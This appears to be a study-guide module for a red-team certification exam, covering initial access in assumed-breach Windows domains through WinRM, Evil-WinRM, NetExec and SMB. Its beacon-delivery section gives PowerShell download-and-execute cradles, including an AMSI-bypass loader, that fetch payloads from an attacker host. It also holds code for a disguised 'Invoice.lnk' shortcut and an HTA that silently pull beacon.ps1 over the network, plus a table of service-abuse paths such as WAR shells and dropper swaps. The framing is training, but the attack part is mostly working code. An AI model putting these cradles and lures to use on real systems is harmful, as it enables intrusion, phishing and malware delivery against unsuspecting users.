# Phase 05: Initial Access in Assumed Breach Scenarios

> **Why this phase exists**: The exam gives you domain credentials and says "go." But turning those credentials into a C2 beacon requires understanding what protocols Windows uses for remote access, which ones are open, and how to authenticate through each one.

**Study time**: 3 days
**Difficulty**: Beginner–Intermediate

---

## Learning Objectives

- [ ] Explain WinRM — what it is, why it exists, when it's enabled
- [ ] Explain how Evil-WinRM uses WinRM to give you a PowerShell shell
- [ ] Explain SMB and what it's used for in lateral movement
- [ ] Understand the assumed breach model and how to verify your creds immediately
- [ ] Deliver a beacon from a remote shell to a Windows target

---

## 1. What is WinRM and Why Does It Matter?

**Windows Remote Management (WinRM)** is Microsoft's implementation of the WS-Management protocol — it lets you run PowerShell commands on remote systems. It's the plumbing behind `Enter-PSSession`, PowerShell remoting, and `Invoke-Command`.

**Port**: 5985 (HTTP) or 5986 (HTTPS)

**Why it's enabled**: Sysadmins use it to manage servers remotely without RDP. In many enterprise environments, WinRM is intentionally enabled on servers and management workstations.

**Why attackers love it**: If WinRM is enabled and your credentials work, you get an interactive PowerShell shell. No binary dropped, no service created — just PowerShell over an authenticated connection.

```bash
# Check if WinRM is open on a host
nxc winrm <target_ip> -u username -p Password1 -d domain.local
# (Pwn3d!) = you can get a shell here

# Get the shell
evil-winrm -i <target_ip> -u domain\\username -p Password1
# Now you're in an interactive PowerShell session on the remote host
```

**Evil-WinRM extras**: It also handles upload/download, loading PowerShell scripts in-memory, and AMSI bypass options:

```bash
evil-winrm -i <target_ip> -u username -p Password1 \
  -s /path/to/scripts/   # auto-load .ps1 scripts in-memory
  -e /path/to/exes/      # auto-load exes for in-memory execution
```

### When WinRM is not available

Not every host will have WinRM enabled. Alternatives:
- **RDP (3389)**: Slower, noisier, but works anywhere. `xfreerdp /u:user /p:pass /v:target`
- **SMB execution**: PsExec, WMIexec — port 445. Works on any Windows with file sharing.
- **MSSQL (1433)**: If a SQL server is accessible and your creds have rights.

---

## 2. Verifying Your Credentials Immediately

The first thing to do with your exam credentials:

```bash
# Does the credential work at all?
nxc smb <dc_ip> -u username -p Password1 -d domain.local
# + = valid credential, not admin
# (Pwn3d!) = valid credential + local admin

# Find all hosts reachable on the network
nxc smb <subnet>/24 -u username -p Password1 --no-bruteforce 2>/dev/null

# Which hosts have WinRM open?
nxc winrm <subnet>/24 -u username -p Password1

# Does the DC respond to LDAP? (confirms domain is reachable)
ldapsearch -H ldap://<dc_ip> -D username@domain.local -w Password1 -b "" -s base
```

**This should take under 3 minutes.**

---

## 3. Delivering Your Beacon

Once you have access via Evil-WinRM, deliver your beacon:

```powershell
# Method 1: PowerShell download + execute (simplest)
*Evil-WinRM* PS> (New-Object Net.WebClient).DownloadFile('http://<kali_ip>:8080/beacon.exe','C:\Windows\Temp\svc.exe')
*Evil-WinRM* PS> C:\Windows\Temp\svc.exe

# Method 2: In-memory cradle (no disk touch for payload)
*Evil-WinRM* PS> IEX (New-Object Net.WebClient).DownloadString('http://<kali_ip>:8080/amsi.ps1')
*Evil-WinRM* PS> IEX (New-Object Net.WebClient).DownloadString('http://<kali_ip>:8080/beacon.ps1')
```

**Host files from Kali**:
```bash
python3 -m http.server 8080 --directory ~/exam/payloads/
```

---

## 4. Abusing Misconfigured Services

Beyond WinRM, the exam may have intentionally misconfigured services:

| Service | What misconfiguration looks like | How to abuse |
|---------|--------------------------------|-------------|
| HTTP portal with default creds | `admin:admin`, `admin:password` | Login → find file upload or command exec |
| SMB share with write access | `net use` shows writable share | Drop autorun file, wait for execution |
| MSSQL with domain creds | `sa` or Windows auth works | xp_cmdshell if sysadmin |
| Scheduled task with weak script | Script is in user-writable path | Replace script with beacon dropper |
| Tomcat / web app exposed | Default manager creds | Upload WAR shell |

---

## 5. Weaponized LNK and HTA (If Delivery is Required)

Some exam scenarios may require you to deliver a payload to a user rather than connecting directly.

### LNK (shortcut) file
```powershell
$lnk = (New-Object -COM WScript.Shell).CreateShortcut("Invoice.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = '-w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ip>/beacon.ps1'')"'
$lnk.IconLocation = "%SystemRoot%\system32\shell32.dll,3"  # looks like a document
$lnk.Save()
```

**Why LNKs work**: They're executed by Windows Explorer when double-clicked. The icon can be changed to look like a Word document or PDF. The TargetPath is hidden from the user.

### HTA (HTML Application)
```html
<!-- beacon.hta -->
<script language="VBScript">
  CreateObject("WScript.Shell").Run "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<ip>/beacon.ps1')", 0
</script>
```

**Why HTAs work**: They're executed by `mshta.exe` — a legitimate, signed Microsoft binary. AppLocker usually allows it. Defender doesn't flag the execution itself (only the contents of the PS script it downloads, which you've already bypassed AMSI for).

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Breach](https://tryhackme.com/room/breachingad) | THM (Sub) | Assumed breach, initial AD foothold |
| [HTB: Active](https://app.hackthebox.com/machines/Active) | HTB (Free) | SMB, credential recovery, DA path |
| [HTB: Forest](https://app.hackthebox.com/machines/Forest) | HTB (Free) | AS-REP roast → foothold, classic exam-style |
| Manual: Evil-WinRM → Beacon drill | Your lab | WinRM → deliver beacon → confirm C2 callback |

---

## Phase 05 Mastery Checklist

- [ ] Can you verify a set of domain credentials using NetExec in under 60 seconds?
- [ ] Can you explain what WinRM is, why it exists, and what port it uses?
- [ ] Can you get an Evil-WinRM shell and deliver a beacon to that host?
- [ ] Can you explain why an LNK file is a useful delivery method and what makes it convincing?
- [ ] Can you explain how HTAs work and why `mshta.exe` is useful to attackers?

---

## Next Phase → **Phase 06: Local Enumeration — What to Look For and Why**
